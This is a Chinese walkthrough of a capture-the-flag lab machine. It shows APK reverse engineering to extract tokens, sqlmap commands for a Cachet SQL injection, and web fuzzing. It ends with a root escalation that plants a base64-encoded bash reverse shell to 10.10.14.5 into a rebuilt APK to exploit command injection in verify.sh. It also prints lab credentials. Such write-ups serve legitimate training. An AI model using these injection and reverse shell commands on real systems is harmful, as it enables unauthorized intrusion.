# 前言

这是一台中等难度的靶机，靶机主要考察的是对安卓程序的逆向分析、SQL注入等知识。

# 解题思路

![image](https://image.3001.net/images/20220422/1650588362_6261faca7f826ac5b79fd.png!small)

# 信息收集

目标主机开放了ssh、web、ppp、udnp等服务

![image.png](https://image.3001.net/images/20220417/1650168048_625b90f0be364d92a31af.png!small)

访问web页面时，发现存在一个APK软件，可以下载下来进行逆向分析。使用的工具是`dex2jar`和`jd-gui`，发现了一个新的域名

![image.png](https://image.3001.net/images/20220417/1650171126_625b9cf66636781305091.png!small)

这边使用MobSF框架对这个APK软件进行分析，发现存在一个`lets_chat_token`值，这个值非常有用

    
    
    "gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"
    "lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
    "slack_token" : "xoxp-23984754863-2348975623103"
    

![image](https://image.3001.net/images/20220418/1650261395_625cfd937e7ca72bfe112.png!small)

回到信息收集时的8000端口，发现是一个`Cachet`的CMS框架

![image](https://image.3001.net/images/20220418/1650261932_625cffac24a26e9366615.png!small)

在搜索引擎上搜索发现，存在Nday的sql注入漏洞

![image](https://image.3001.net/images/20220418/1650261971_625cffd34461bbab2e63b.png!small)

# 漏洞利用

因为常规的post表单注入SQLMAP无法检测到注入点，因此需要使用盲注注入技巧，这个CMS框架的审计可以参考这篇文章[Cachet_CMS代码审计](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html)

    
    
    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
    

![image.png](https://image.3001.net/images/20220418/1650262210_625d00c2d82aac66290e8.png!small)

对`cachet`数据库进行注入

    
    
    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbs
    

![image.png](https://image.3001.net/images/20220418/1650275091_625d3313412816336dd7d.png!small)

对users表进行注入

    
    
    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet --tables
    

![image.png](https://image.3001.net/images/20220418/1650275161_625d33596d701e7390f45.png!small)

对users表进行字段值注入

    
    
    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet -T users --columns
    

![image.png](https://image.3001.net/images/20220419/1650331261_625e0e7d2796d82f85294.png!small)

继续注入发现了对应用户的账户名和哈希值，但是是使用了Blowfish加密的，不能解密成功

![image](https://image.3001.net/images/20220420/1650416115_625f59f3070f104ec0ee4.png!small)

没有思路了，尝试fuzz一下路径，发现了两个重定向路径

    
    
    ffuf -c -u "http://status.catch.htb:5000/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    

![image.png](https://image.3001.net/images/20220420/1650419771_625f683b8cf6937d0302d.png!small)

使用上面获得了一个token值，可以分别对这些401目录进行网络包请求，`Authorization: bearer`字段是JWT的schema头定义

    
    
    curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms
    

可以看到，获取到了很多对应的JSON值信息

![image.png](https://image.3001.net/images/20220422/1650599471_6262262fd9f96498e73e8.png!small)

带着请求头信息，去继续模糊web路径

    
    
    ffuf -c -u "http://status.catch.htb:5000/rooms/61b86b28d984e2451036eb17/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
    

![image.png](https://image.3001.net/images/20220420/1650420792_625f6c386a8ed4e3e9e1f.png!small)

    
    
    curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://status.catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages
    

得到了john的用户名和密码`john:E}V!mywu_69T4C}W`

![image.png](https://image.3001.net/images/20220422/1650599421_626225fd843d2a74868a1.png!small)

上传事件时要捕获一个数据包，上传路径和上传参数对应之后发送，可以获取到一个shell终端

![image.png](https://image.3001.net/images/20220420/1650435449_625fa5797a7aec9a4f421.png!small)

初步判断目前在docker容器内，想要进一步提权可能需要进行逃逸操作

![image.png](https://image.3001.net/images/20220420/1650435637_625fa635ba596af60de83.png!small)

# 提权

## www-data提权will

查看.env文件发现存在了数据库名和密码`s2#4Fg0_%3!`

![image.png](https://image.3001.net/images/20220420/1650437095_625fabe7c6383ffd81631.png!small)

成功登录will用户

![image.png](https://image.3001.net/images/20220420/1650437206_625fac5609425282f274a.png!small)

## will提权到root

导入linpeas.sh脚本时，发现了一个存在漏洞的脚本`verify.sh`，这个脚本中存在一个命令注入点。可以通过控制`APP_NAME`的值进行命令注入

![image.png](https://image.3001.net/images/20220420/1650439376_625fb4d0281496cd9156f.png!small)

可以先使用`apktool`工具对apk文件进行源码还原，然后找到`/res/values/strings.xml`文件，并将生成的payload进行替换

    
    
    echo '/bin/bash \-i \>& /dev/tcp/10\.10\.14\.5/4444 0\>&1' \| base64
    

![image](https://image.3001.net/images/20220421/1650534365_626127dd1bfc35c05e192.png!small)

然后使用新的apktool文件生成一个新的apk文件，因为要成功利用必须使用新的安卓文件进行命令执行

    
    
    sudo java -jar apktool\_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apk
    

![image](https://image.3001.net/images/20220421/1650534437_6261282506ec27e48b3f0.png!small)

并对这个新的apk文件生成一个新的签名

    
    
    keytool -genkey -v -keystore my-release-key.keystore -alias alias\_name -keyalg RSA -keysize 2048 -validity 10000
    

![image](https://image.3001.net/images/20220421/1650534510_6261286ecaa31ca132673.png!small)

最后将新的apk文件下载并上传到`apk_bin`目录上，开启监听获取root用户的权限

![image](https://image.3001.net/images/20220421/1650534624_626128e02e640c2f39419.png!small)

![image](https://image.3001.net/images/20220421/1650534609_626128d1a8c6d981c18a4.png!small)

